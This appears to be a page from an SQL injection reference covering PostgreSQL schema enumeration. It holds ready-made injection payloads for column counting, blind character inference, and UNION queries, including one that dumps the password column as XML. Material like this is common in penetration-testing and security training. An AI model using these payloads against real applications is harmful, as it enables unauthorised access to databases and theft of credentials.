---
title: Tables and Columns
description: Techniques for enumerating tables and columns in PostgreSQL
category: Information Gathering
order: 14
tags: ["schema enumeration", "tables", "columns", "xml"]
lastUpdated: 2025-12-15
---

## Tables and Columns

Enumerating database structure is a critical step in SQL injection attacks. PostgreSQL provides multiple methods to discover tables and columns, primarily through the standard `information_schema` and the PostgreSQL-specific `pg_catalog`.

### Determining Number of Columns

Before extracting data with `UNION` queries, you must determine the number of columns in the current query.

#### Using ORDER BY

Increment the column index until the query throws an error:

```sql
-- Valid
SELECT * FROM users ORDER BY 1;
SELECT * FROM users ORDER BY 2;

-- Throws error (e.g., "ORDER BY position 10 is not in select list")
SELECT * FROM users ORDER BY 10;
```

#### Using UNION SELECT NULL

Inject `UNION SELECT` with increasing numbers of NULLs until the query succeeds:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Retrieving Tables

#### Using information_schema (Standard)

The `information_schema.tables` view contains details about all tables.

```sql
-- List all public tables
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';

-- List all tables excluding system schemas
SELECT table_schema, table_name FROM information_schema.tables
WHERE table_schema NOT IN ('pg_catalog', 'information_schema');
```

#### Using pg_catalog (PostgreSQL Specific)

The `pg_tables` view or `pg_class` catalog can be used.

```sql
-- Using pg_tables (easier)
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- Using pg_class (more detailed)
SELECT relname FROM pg_class
WHERE relkind = 'r'
AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public');
```

### Retrieving Columns

#### Using information_schema

```sql
-- List columns for a specific table
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_name = 'users';

-- Find tables containing specific column names (e.g., password)
SELECT table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%';
```

#### Using pg_catalog

```sql
-- List columns using pg_attribute
SELECT a.attname
FROM pg_attribute a
JOIN pg_class c ON a.attrelid = c.oid
WHERE c.relname = 'users'
AND a.attnum > 0
AND NOT a.attisdropped;
```

### Data Extraction Techniques

#### String Aggregation

If you can only retrieve one row, use `string_agg` to combine results:

```sql
-- Get all table names in one string
SELECT string_agg(table_name, ',')
FROM information_schema.tables
WHERE table_schema = 'public';
```

#### Boolean Inference (Blind)

For blind SQL injection, infer names character by character:

```sql
-- Check if first letter of first table is 'u'
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='u' --
```

### XML Helper Functions

PostgreSQL provides powerful functions to export query results as XML, which is excellent for dumping data in `UNION` based injections.

```sql
-- Dump query result as XML
SELECT query_to_xml('SELECT * FROM users', true, true, '');

-- Dump entire table as XML
SELECT table_to_xml('users', true, true, '');

-- Dump schema structure
SELECT database_to_xmlschema(true, true, '');
```

**Injection Example:**

```sql
' UNION SELECT 1, query_to_xml('SELECT password FROM users',true,true,'')::text, 3 --
```

### Injection Examples

```sql
-- Enumerate tables
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='public'--

-- Enumerate columns
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--

-- Using LIMIT/OFFSET to retrieve one by one
' UNION SELECT 1, table_name, 3 FROM information_schema.tables LIMIT 1 OFFSET 0--
```
